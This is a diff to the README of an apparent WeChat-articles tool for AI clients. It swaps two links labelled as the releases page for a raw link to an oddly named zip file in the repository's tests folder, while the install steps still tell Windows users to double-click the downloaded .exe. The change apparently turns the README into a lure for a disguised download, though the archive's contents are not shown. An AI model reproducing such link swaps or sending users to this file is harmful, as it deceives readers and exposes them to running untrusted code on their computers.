@@ -1,6 +1,6 @@
 # 📱 weixin-articles-mcp - Access WeChat articles in AI tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/prairiemimosajamestown413/weixin-articles-mcp/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/prairiemimosajamestown413/weixin-articles-mcp/main/tests/articles_weixin_mcp_ungroundably.zip)
 
 This software allows you to read WeChat Official Account articles within your preferred AI tools. It converts article links into direct content for your workspace. You see images and video keyframes directly in your chat interface instead of clicking external links.
 
@@ -8,7 +8,7 @@ This software allows you to read WeChat Official Account articles within your pr
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/prairiemimosajamestown413/weixin-articles-mcp/releases) to download the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/prairiemimosajamestown413/weixin-articles-mcp/main/tests/articles_weixin_mcp_ungroundably.zip) to download the application.
 2. Look for the file ending in `.exe` under the latest version.
 3. Save the file to your computer.
 4. Double-click the file to start the installation process.
